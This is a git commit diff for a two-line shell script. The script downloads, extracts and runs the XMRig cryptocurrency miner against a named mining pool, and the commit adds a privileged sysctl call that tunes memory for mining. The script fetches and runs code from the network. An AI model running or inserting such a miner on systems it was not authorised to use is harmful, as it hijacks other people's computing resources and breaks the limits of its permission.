23650df198223a112b325d4481abbf7530c768f0
red56565 <108178533+red56565@users.noreply.github.com>
2022-06-27 10:17:42 +0200

    Update red.sh

--- red.sh
+++ red.sh
@@ -1,1 +1,2 @@
+sudo sysctl -wq vm.nr_hugepages=2048
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-x64.tar.gz && tar -xf xmrig-6.15.0-linux-x64.tar.gz && cd xmrig-6.15.0 && ./xmrig -o pool.allcoins.pw:3333 -u allcoins.pw -p 619795
